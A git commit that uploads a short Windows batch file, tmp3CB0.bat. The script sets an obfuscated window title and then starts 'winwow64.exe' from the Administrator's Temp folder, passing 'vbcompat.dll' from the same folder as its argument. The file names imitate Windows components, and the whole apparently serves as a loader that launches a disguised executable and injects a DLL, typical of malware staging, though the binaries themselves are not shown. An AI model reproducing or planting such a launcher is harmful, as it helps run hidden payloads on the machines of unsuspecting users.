68196446a3bafdbd38009bc7cec128955357052b
MizuiroDzn <96056137+MizuiroDzn@users.noreply.github.com>
2024-07-31 20:31:58 +0900

    Add files via upload

---
+++ tmp3CB0.bat
@@ -0,0 +1,6 @@
+@echo off
+title %dsa932#(230#)*$
+set DLL_PATH="C:\Users\Administrator\AppData\Local\Temp\vbcompat.dll"
+set EXE_PATH="C:\Users\Administrator\AppData\Local\Temp\winwow64.exe"
+
+start "" %EXE_PATH% %DLL_PATH%
